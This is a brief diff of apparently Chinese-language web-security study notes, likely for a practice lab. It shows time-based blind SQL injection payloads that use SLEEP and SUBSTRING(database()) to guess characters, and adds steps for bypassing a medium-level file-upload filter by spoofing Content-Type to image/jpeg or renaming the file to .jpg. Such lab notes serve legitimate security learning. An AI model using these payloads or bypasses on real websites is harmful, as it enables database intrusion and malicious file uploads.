@@ -44,3 +44,7 @@
 # 时间盲注
 1' AND IF(1=1, SLEEP(5), 0)#     # 测试延时
 1' AND IF(SUBSTRING(database(),1,1)='d', SLEEP(5), 0)#   # 猜字符延时
+
+# Medium 级别绕过
+- 拦截请求，修改 Content-Type: image/jpeg
+- 可选修改文件名为 .jpg
